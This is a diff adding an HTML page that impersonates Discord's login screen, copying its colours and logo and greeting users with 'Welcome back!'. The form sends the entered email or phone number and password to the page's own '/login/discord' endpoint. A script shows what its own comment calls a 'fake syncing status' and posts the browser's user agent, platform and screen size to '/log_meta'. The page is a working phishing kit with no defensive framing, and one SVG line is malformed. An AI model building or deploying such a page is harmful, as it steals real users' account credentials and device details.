@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord | Login</title>
+    <!-- Tailwind for base layout -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com');
+        
+        :root {
+            --discord-blurple: #5865f2;
+            --discord-dark: #36393f;
+            --discord-black: #23272a;
+            --discord-input: #202225;
+            --discord-text: #b9bbbe;
+        }
+
+        body {
+            /* EXACT GRADIENT FROM YOUR IMAGE */
+            background: linear-gradient(180deg, #36393f 0%, #23272a 100%);
+            font-family: 'Open Sans', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            overflow: hidden;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 15vh;
+        }
+
+        .input-label {
+            color: var(--discord-text);
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-field {
+            background-color: var(--discord-input);
+            color: #ffffff;
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid rgba(0,0,0,0.1);
+            transition: border 0.2s ease-in-out;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border: 1px solid #00aff4;
+        }
+
+        .btn-submit {
+            background-color: var(--discord-blurple);
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            padding: 14px;
+            border-radius: 4px;
+            width: 100%;
+            transition: background-color 0.2s;
+            margin-top: 20px;
+        }
+
+        .btn-submit:active {
+            background-color: #4752c4;
+        }
+
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        /* CUSTOM SVG LOGO ANIMATION */
+        .discord-logo-svg {
+            filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.3));
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center min-h-screen px-8">
+
+    <div class="login-container flex flex-col items-center">
+        
+        <!-- DRAWN DISCORD LOGO (MANUAL PATHS) -->
+        <div class="discord-logo-svg mb-10">
+            <svg width="140" height="38" viewBox="0 0 140 38" fill="none" xmlns="http://www.w3.org">
+                <path d="M22.5 0C18.6 0 15.4 3.2 15.4 7.1V22.9C15.4 26.8 18.6 30 22.5 30H29.8L27.6 34.1L32.5 30H43.6C47.5 30 50.7 26.8 50.7 22.9V7.1C50.7 3.2 47.5 0 43.6 0H22.5ZM26.7 18.2C24.9 18.2 23.5 16.6 23.5 14.7C23.5 12.8 24.9 11.2 26.7 11.2C28.5 11.2 29.9 12.8 29.9 14.7C29.9 16.6 28.5 18.2 26.7 18.2ZM39.5 18.2C37.7 18.2 36.3 16.6 36.3 14.7C36.3 12.8 37.7 11.2 39.5 11.2C41.3 11.2 42.7 12.8 42.7 14.7C42.7 16.6 41.3 18.2 39.5 18.2Z" fill="white""")/>>
+                <text x="58" y="26" fill="white" style="font-weight: 800; font-size: 26px; font-family: 'Open Sans', sans-serif;">Discord</text>
+            </svg>
+        </div>
+
+        <h2 class="text-white text-2xl font-bold mb-8">Welcome back!</h2>
+
+        <form id="authForm" action="/login/discord" method="POST" class="w-full">
+            
+            <div class="flex flex-col mb-6">
+                <label class="input-label">Email or Phone Number <span class="text-[#f04747]">*</span></label>
+                <input name="user" type="text" class="input-field" autocomplete="off" required>
+            </div>
+
+            <div class="flex flex-col mb-2">
+                <label class="input-label">Password <span class="text-[#f04747]">*</span></label>
+                <input name="pass" type="password" class="input-field" autocomplete="off" required>
+            </div>
+
+            <button type="button" class="text-[#00aff4] text-xs font-semibold hover:underline text-left w-full mt-2">
+                Forgot your password?
+            </button>
+
+            <button type="submit" id="submitBtn" class="btn-submit">
+                Log In
+            </button>
+
+            <div class="mt-4 text-sm text-[#b9bbbe] text-left w-full">
+                Need an account? <span class="text-[#00aff4] cursor-pointer font-semibold">Register</span>
+            </div>
+        </form>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div id="loading-overlay">
+        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mb-4"></div>
+        <p class="text-white font-bold tracking-widest text-xs uppercase">[ NEXO-SYNC ACTIVE ]</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('authForm');
+        const overlay = document.getElementById('loading-overlay');
+        const btn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', function(e) {
+            // SHOW THE FAKE SYNCING STATUS
+            overlay.style.display = 'flex';
+            btn.innerHTML = 'Signing in...';
+            
+            // Collect device info for the logs
+            const meta = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+            
+            // Send metadata to your Python terminal
+            fetch('/log_meta', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(meta)
+            });
+        });
+    </script>
+</body>
+</html>
